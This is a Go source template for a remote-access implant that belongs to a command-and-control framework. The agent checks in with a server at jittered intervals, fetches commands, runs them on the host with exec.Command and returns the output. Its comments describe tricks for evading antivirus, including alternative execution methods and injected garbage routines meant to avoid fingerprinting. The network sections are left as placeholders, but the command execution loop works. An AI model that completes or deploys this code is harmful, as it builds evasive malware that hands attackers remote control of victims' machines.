package main

/*
an agent must:
	*-send communications back to the server
		checkin:
			- optionally provide info like username, arch and computer name
		response:
			- command response/data

	*-receive communications/commands from the server
	-execute commands on the machine
	-set global vars

This is a template - copy this out, and paste it into an isolated directory for development.

Write your code in the sections that are delimited with curly braces - always start your code with * / (without the space) and end it with /*

Provided the agent doesn't use any OS specific functions or code, this should enable the ability to generate agents for whichever arch is needed

*/

import (
	/*{{.Imports}}*/ //Don't forget any imports!!
	"math/rand"

	"os/exec"
	"strings"
	"time"
	"unicode"
)

/*{{.GlobalVars}}*/

type agent struct {
	uid       string
	osType    string
	settings  agentSettings
	cmd       string
	cmdID     string
	cmdResult []byte
}

type agentSettings struct {
	maplol map[string]string
}

func (as *agentSettings) Set(k, v string) {
	as.maplol[k] = v
}

func (as *agentSettings) Get(k string) string {
	return as.maplol[k]
}

func (a *agent) Checkin() {

	tick := time.NewTicker(time.Second * 3)
	for {
		//timeout
		select {
		case <-tick.C:
			/*{{.Checkin}}*/

			tick.Stop()
			randyboi := rand.Intn(10000) //10 seconds variance
			tick = time.NewTicker(time.Duration(randyboi) * time.Millisecond)
		}

	}

}

func (a *agent) Init() {
	/*{{.Init}}*/

	rand.Seed(time.Now().UnixNano()) //probably a bad idea, whatever
	a.uid = RandStringRunes(10)
	//*/
}

func (a *agent) GetCommand() bool {

	/*{{.GetCommand}}*/
	return false

}

func (a *agent) GetSetting(s string) string {
	return a.settings.Get(s)
}

func (a *agent) SetSetting(k, v string) {
	a.settings.Set(k, v)
}

func main() {
	//create agent
	a := agent{
		settings: agentSettings{
			maplol: make(map[string]string),
		},
	}
	a.Init()
	go a.Checkin()
	for {
		if a.GetCommand() {
			a.ExecCommand()
		}
		v := rand.Intn(10000)
		time.Sleep(time.Millisecond * time.Duration(v))
	}
}

func cmmdFmt(s string) []string {
	lastQuote := rune(0)
	f := func(c rune) bool {
		switch {
		case c == lastQuote:
			lastQuote = rune(0)
			return false
		case lastQuote != rune(0):
			return false
		case unicode.In(c, unicode.Quotation_Mark):
			lastQuote = c
			return false
		default:
			return unicode.IsSpace(c)

		}
	}

	return strings.FieldsFunc(s, f)
}

func (a *agent) ExecCommand() {
	/*{{.ExecCommand}}*/

	//execute command in system
	// (This should work by default. Template is here to enable alternative execution methods incase AV catches on that smashing exec.Command is not a good sign etc.)
	c := a.cmd
	cmds := cmmdFmt(c)
	if len(cmds) < 1 {
		return
	}
	p := exec.Command(cmds[0], cmds[1:]...)
	result, e := p.Output()

	if e != nil {
		result = []byte(e.Error())
	}
	a.SendResponse(result)

}

func (a *agent) SendResponse(b []byte) {
	/*{{.SendResponse}}*/

}

//dynamically generate and inject garbage routines into function calls to avoid AV fingerprinting too easily.
//Usage: When initialising the AgentCode struct(x := AgentCode{}), call the AVoidance("") method (x.AVoidance(""))
//The string provided will be added to the init function, so if you have your own AVoidance techniques you can inject them there.

/*{{.AVoidance}}*/

func RandStringRunes(n int) string {
	var letterRunes = []byte("abcdefghijklmnopqrstuvwxyz1234567890")
	b := make([]byte, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}
